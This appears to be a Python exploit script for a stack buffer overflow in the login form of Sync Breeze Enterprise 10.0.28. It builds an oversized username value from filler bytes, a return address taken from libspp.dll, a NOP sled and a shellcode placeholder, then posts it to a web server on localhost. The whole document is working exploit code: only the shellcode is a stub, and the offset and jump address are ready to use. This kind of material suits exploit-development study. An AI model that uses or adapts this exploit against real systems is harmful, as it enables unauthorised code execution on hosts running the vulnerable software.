import socket, sys, struct

# Sync Breeze Enterprise v10.0.28

ESP = 0x10090c83 # libspp.dll

# üêö Shellcode placeholder
# \xCC is just a sigtrap
SHELL =  b"\xCC" * 4

# GLOBAL
SOCKET_TIMEOUT = 120
IP = 'localhost'
PORT = 80
BUF = b'A' * 780
BUF += struct.pack('<I', ESP) # EIP
BUF += b'C' * 4
BUF += b'\x90' * 16
BUF += SHELL

# POST DATA
DATA = b'username=' + BUF + b'&password=A'

# POST Request
REQ = b''
REQ += b'POST /login HTTP/1.1\r\n'
REQ += b'Host: ' + IP.encode() + b'\r\n'
REQ += b'User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n'
REQ += b'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
REQ += b"Accept-Language: en-US,en;q=0.5\r\n"
REQ += b"Referer: http://" + IP.encode() + b"/login\r\n"
REQ += b"Connection: close\r\n"
REQ += b'Content-Type: application/x-www-form-urlencoded\r\n'
REQ += b'Content-Length: ' + str(len(DATA)).encode() + b'\r\n'
REQ += b'\r\n'
REQ += DATA

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(SOCKET_TIMEOUT)

try:
    print(f'[+] Connecting to {IP}:{PORT}')
    sock.connect((IP, PORT))
    print(f'[*] Sending request')
    sock.send(bytes(REQ))
    print(f'[+] Payload has been sent')
    res = sock.recv(1024)
    fixed_res = str(res, 'utf-8').replace('\\r\\n', '\n')
    print(f'[!] Response:\r\n{fixed_res}')

except socket.timeout:
    print("[-] Connection Timed out\n[*] Quitting...")
    sys.exit()

except KeyboardInterrupt:
    print('[-] Cancelled by user\n[*] Quitting...')
    sys.exit()

except TypeError:
    print('[-] Bytes required, not string')
    sys.exit()

except:
    print("[-] Could not establish connection\n[*] Quitting...")
    sys.exit()
